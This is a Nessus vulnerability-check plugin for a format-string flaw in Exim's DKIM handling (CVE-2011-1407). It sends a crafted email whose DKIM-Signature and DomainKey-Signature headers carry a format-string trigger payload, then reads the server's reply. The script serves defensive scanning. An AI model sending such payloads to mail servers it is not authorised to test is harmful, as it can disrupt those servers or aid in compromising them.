#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53856);
  script_version('$Revision: 1.13 $');
  script_cvs_date("$Date: 2015/11/05 21:23:49 $");

  script_cve_id("CVE-2011-1407", "CVE-2011-1764");
  script_bugtraq_id(47736, 47836);
  script_osvdb_id(72156, 72642);

  script_name(english:"Exim < 4.76 dkim_exim_verify_finish() DKIM-Signature Header Format String");
  script_summary(english:"Attempts to trigger a logging error with a specially crafted message.");

  script_set_attribute(attribute:"synopsis", value:
"The remote mail server is potentially affected by a format string
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Based on its response to a specially formatted mail message, the Exim
mail server listening on this port appears to be affected by a format
string vulnerability. The vulnerability is due to a failure in the
dkim_exim_verify_finish() function to properly sanitize format string
specifiers in the DKIM-Signature header. A remote attacker can exploit
this by sending a specially crafted email, resulting in the execution
of arbitrary code as the Exim run-time user.");
  script_set_attribute(attribute:"see_also", value:"ftp://ftp.exim.org/pub/exim/ChangeLogs/ChangeLog-4.76");
  script_set_attribute(attribute:"see_also", value:"https://lists.exim.org/lurker/message/20110506.112357.e99a8db1.en.html");
  script_set_attribute(attribute:"see_also", value:"http://bugs.exim.org/show_bug.cgi?id=1106");
  script_set_attribute(attribute:"solution", value:"Upgrade to Exim 4.76 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/05/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/10");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:exim:exim");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");
include("audit.inc");

port = get_service(svc:"smtp", default:25, exit_on_fail:TRUE);

if (report_paranoia < 2)
{
  banner = get_smtp_banner(port:port);
  if (!banner) audit(AUDIT_NO_BANNER, port);
  if ("Exim" >!< banner) audit(AUDIT_NOT_LISTEN, "Exim SMTP server", port);
}

soc = smtp_open(port:port, helo:"nessus");
if (isnull(soc)) audit(AUDIT_SOCK_FAIL, port);

sentFrom = smtp_from_header();
if (sentFrom !~ ' *<.*> *') sentFrom = strcat('<', sentFrom, '>');
s = 'MAIL FROM: ' + sentFrom;
send(socket:soc, data:s+'\r\n');
res = smtp_recv_line(socket:soc);
if (!ereg(pattern:"^2[0-9][0-9] ", string:res))
{
  smtp_close(socket:soc);
  audit(AUDIT_RESP_BAD, port, s);
}

sentTo = smtp_to_header();
if (sentTo !~ ' *<.*> *') sentTo = strcat('<', sentTo, '>');
s = 'RCPT TO: ' + sentTo;
send(socket:soc, data:s+'\r\n');
res = smtp_recv_line(socket:soc);
if (!ereg(pattern:"^2[0-9][0-9] ", string:res))
{
  # If we don't have a valid email and are paranoid, do a banner
  # version check and report if it is vulnerable, otherwise
  # output why we can't test the server.
  smtp_close(socket:soc);
  if (report_paranoia >= 2)
  {
    banner = get_smtp_banner(port: port);
    match = eregmatch(string:banner, pattern:"Exim ([0-9.]+)");
    if (!isnull(match) && !isnull(match[1]))
    {
      version = match[1];
      if (ver_compare(ver:version, fix:"4.76", strict:FALSE) == -1)
      {
        if (report_verbosity > 0)
        {
          report = '\n  Detected version : ' + version +
                   '\n  Fixed version    : 4.76' +
                   '\n\nNote that since this is a paranoid scan, Nessus is simply checking' +
                   '\nthe version reported in the SMTP banner. The relevant security patches' +
                   '\nmay have been backported to this version of Exim.';
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }
  }
  exit(0, "The SMTP server listening on port " + port + " did not accept " + sentTo + " as a recipient email address, so Nessus cannot test if the server is vulnerable.");
}

s = 'DATA';
send(socket:soc, data:s+'\r\n');
res = smtp_recv_line(socket:soc);
if (!ereg(pattern:"^3[0-9][0-9] ", string:res))
{
  smtp_close(socket:soc);
  audit(AUDIT_RESP_BAD, port, s);
}

s = 'Received: by yie12 with SMTP id 12so190696yie.13
        for ' + sentTo + '; Wed, 11 May 2011 06:18:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=%500\x41\x41\x41\x41\x90\xcc; s=gamma;
        h=domainkey-signature:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=4+g71bvahrOIdgAhK4QD/CMmWBPBAvCruof/ZhV//9w=;
        b=TnH5TyLdO0YfhL8AikMmTDd8+sy5alXPU0aUOeSssCDrVQlGixnxAMLjPrcuSUj2PU
         9zJKX0XbKk1od1xJiD9dQlpfWWe9l8WVODU/hmIIpy3fpDkuYDNAd0XUipEYfFbUI4Qu
         jx+ZWRaFXf1dEdoLqoPKo+1H5AbSxSGXMK12o=
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=%500\x41\x41\x41\x41\x90\xcc; s=gamma;
        h=mime-version:date:message-id:subject:from:to:content-type;
        b=M7SLRBsvj5q14K6eA5D0eehxMpL2YjdAb8ggBaRy97WwomH/4BMAGtu02CTazxZGFA
         DBsIi6F6f9F0pzTYaqT+1jAzMSvYbGGQyNGuLVPRvs5MilzlriQNlQMz0YtoZLyv8uDJ
         G5DD2PcBiB4CrrIJSnaxNwfH0/PkFJaQX5Clk=
MIME-Version: 1.0
Received: by 10.20.30.40 with SMTP id t8mr3592672ybm.249.1305119926536; Wed, 11 May 2011 06:00:00 -0500 (EST)
Received: by 10.20.30.50 with HTTP; Wed, 11 May 2011 06:00:00 -0500 (EST)
Date: Wed, 11 May 2011 08:18:46 -0500
Message-ID: <BANLkTik2OMre+tACnsPJeLCiuMnigs4NCA@mail.nessus.org>
Subject: nessus exim_4_76.nasl
From: ' + sentFrom + '
To: ' + sentTo + '
Content-Type: multipart/alternative; boundary=001b24be1bac9c498e04a2ffe9de

--001b24be1bac9c498e04a2ffe9de
Content-Type: text/plain; charset=ISO-8859-1

' + rand_str(length:18) + '

--001b24be1bac9c498e04a2ffe9de
Content-Type: text/html; charset=ISO-8859-1

' + rand_str(length:18) + '


--001b24be1bac9c498e04a2ffe9de--
.\r\n
';
send(socket:soc, data:s);
res = smtp_recv_line(socket:soc);

smtp_close(socket:soc);

if ("421 Unexpected" >< res)
{
  security_hole(port);
  exit(0);
}
else audit(AUDIT_LISTEN_NOT_VULN, "Exim SMTP Server", port);
